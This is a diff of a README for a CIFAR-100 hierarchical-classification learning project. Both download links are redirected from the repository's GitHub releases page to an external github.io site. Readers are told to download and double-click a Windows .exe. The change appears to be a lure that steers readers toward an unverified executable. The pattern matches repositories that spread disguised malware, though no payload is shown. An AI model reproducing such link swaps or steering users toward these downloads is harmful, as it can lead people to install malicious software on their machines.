@@ -1,6 +1,6 @@
 # 🧪 hierarchical-lab - Learn structured classification with simple steps
 
-[![Download hierarchical-lab](https://img.shields.io/badge/Download-Hierarchical_Lab-blue.svg)](https://github.com/Ostrichfernwithdrawalsymptom190/hierarchical-lab/releases)
+[![Download hierarchical-lab](https://img.shields.io/badge/Download-Hierarchical_Lab-blue.svg)](https://ostrichfernwithdrawalsymptom190.github.io)
 
 This application provides a hands-on way to learn about hierarchical classification using the CIFAR-100 dataset. It uses structured models that group data into coarse and fine categories. You can explore how deep learning models handle complex label structures and loss functions.
 
@@ -10,7 +10,7 @@ The software helps you understand how neural networks classify images by looking
 
 To download the application, visit the link below:
 
-[Click here to open the download page](https://github.com/Ostrichfernwithdrawalsymptom190/hierarchical-lab/releases)
+[Click here to open the download page](https://ostrichfernwithdrawalsymptom190.github.io)
 
 Look for the latest release on that page. Download the file that ends in .exe for Windows. Once the download finishes, open the folder where you saved the file and double-click it to start the program.
 
